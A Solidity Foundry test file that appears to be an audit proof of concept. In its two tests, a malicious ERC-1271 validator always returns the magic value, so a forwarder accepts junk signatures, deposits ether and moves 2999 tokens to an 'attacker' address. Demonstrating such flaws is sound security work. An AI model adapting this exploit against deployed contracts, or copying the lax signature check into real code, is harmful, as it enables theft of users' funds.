// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";
import { IForwarderDigest } from "../src/interfaces/IForwarderDigest.sol";
import { IDomainRegistry } from "../src/interfaces/IDomainRegistry.sol";
import { UserOpHash } from "../src/libraries/UserOpHash.sol";
import { UserOp } from "../src/structs/UserOp.sol";
import { PermitParams } from "../src/structs/PermitParams.sol";
import { DomainRegistryV2 } from "../src/DomainRegistryV2.sol";
import { ForwarderV2 } from "../src/ForwarderV2.sol";
import { SecureRecipientV2 } from "../src/SecureRecipientV2.sol";
import { ReceiverMockV2 } from "../src/mocks/ReceiverMockV2.sol";
import { ERC20PermitMock } from "../src/mocks/ERC20PermitMock.sol";
/// @notice Always magic validator.
import { MalValidator2 } from "../src/malicious/MalValidator2.sol";

contract Validator_PoC is Test {
    DomainRegistryV2 reg;
    IDomainRegistry ireg;
    ForwarderV2 fwd;
    SecureRecipientV2 rcp;
    ReceiverMockV2 rc;
    ERC20PermitMock token0;
    MalValidator2 badAlice;
    MalValidator2 badOwner;
    address alice;
    uint256 alicePK;
    address t_owner;
    uint256 t_ownerPK;
    address attacker;
    uint256 attackerPK;
    
    function setUp() public {
        reg = new DomainRegistryV2();
        ireg = IDomainRegistry(address(reg));
        fwd = new ForwarderV2(ireg);
        rcp = new SecureRecipientV2(ireg);
        rc = new ReceiverMockV2(address(rcp));
        token0 = new ERC20PermitMock();
        badAlice = new MalValidator2();
        badOwner = new MalValidator2();

        (alice, alicePK) = makeAddrAndKey("ALICE");
        (t_owner, t_ownerPK) = makeAddrAndKey("TOKEN_OWNER");

        (attacker, attackerPK) = makeAddrAndKey("ATTACKER");
        reg.registerDomain(block.chainid, address(fwd));
        vm.deal(address(this), 10 ether);
    }

    function _caOp(uint256 val, bytes memory data) internal view returns(UserOp memory) {
        return UserOp({
            sender: address(badAlice),
            to: address(rc),
            value: val,
            gasLimit: 450_000,
            nonce: fwd.nonces(address(badAlice)),
            deadline: block.timestamp + 2,
            data: data
        });
    }

    function _p(uint256 val) internal view returns(PermitParams memory) {
        uint256 dead = block.timestamp + 2;
        bytes32 dig = token0.tokenDigest(address(badOwner), address(rc), val, dead);
        uint8 vv;
        bytes32 rr;
        bytes32 ss;
        (vv, rr, ss) = vm.sign(t_ownerPK, dig);
        return PermitParams({
            token: address(token0),
            owner: address(badOwner),
            spender: address(rc),
            value: val,
            deadline: dead,
            v: vv,
            r: rr,
            s: ss
        });
    }

    // Hybrid params to build badSignature.
    function _badSig(uint256 val) internal view returns(uint8 v, bytes32 r, bytes32 s) {
        uint256 dead = block.timestamp + 2;
        bytes32 dig = token0.tokenDigest(alice, address(fwd), 342, dead + 5);
        (v, r, s) = vm.sign(attackerPK, dig);
    }

    function _badP(uint256 val) internal view returns(PermitParams memory) {
        (uint8 vv, bytes32 rr, bytes32 ss) = _badSig(val);
        return PermitParams({
            token: address(token0),
            owner: address(badOwner),
            spender: address(rc),
            value: val,
            deadline: block.timestamp + 1,
            v: vv,
            r: rr,
            s: ss
        });
    }

    function _dig(UserOp memory op) internal view returns(bytes32) {
        return fwd.digest(op);
    }

    function _sig(bytes32 dig) internal view returns(bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePK, dig);
        address rec = ecrecover(dig, v, r, s);
        require(rec == alice, "signature mismatch");
        return abi.encodePacked(r, s, v);
    }

    // A funder(address.this) trusts badAlice.
    // The badAlice always returns 0x1626ba7e.
    // Funds are transferred to the targert contract without any signature involves.
    function test_PoC1_badAlice_InvalidSig_BalanceIncreased() public {
        UserOp memory op;
        PermitParams memory p;
        bytes memory sig;
        bytes memory data = abi.encodeCall(ReceiverMockV2.deposit, ());
        op = _caOp(1 ether, data);
        sig = bytes("idiot");
        p = _p(0);
        (bool ok, ) = fwd.handleUserOpViaRecipientV2{value: 1 ether}(address(rcp), op, p, sig);
        assertTrue(ok);
        assertEq(address(this).balance, 9 ether);
        assertEq(rc.balanceOf(address(badAlice)), 1 ether);
    }

    // An arbitrarily validator always returns 0x1626ba7e, in a way that allows the attacker to steal assets.
    function test_PoC2_badOwner_BadSig_badOwnerAssetsTransferToAttacker() public {
        token0.mintTokenOf(address(badOwner), 3000);
        UserOp memory op;
        PermitParams memory p;
        bytes memory sig;
        bytes memory data = abi.encodeCall(ReceiverMockV2.transferFrom, (address(token0), address(badOwner), attacker, 2999));
        op = _caOp(0, data);
        sig = bytes("idoit");
        p = _badP(3000);
        (bool ok, ) = fwd.handleUserOpViaRecipientV2(address(rcp), op, p, sig);
        assertTrue(ok);
        assertEq(token0.balanceOf(address(badOwner)), 1);
        assertEq(token0.allowance(address(badOwner), address(rc)), 1);
        assertEq(token0.balanceOf(attacker), 2999);
    }
}
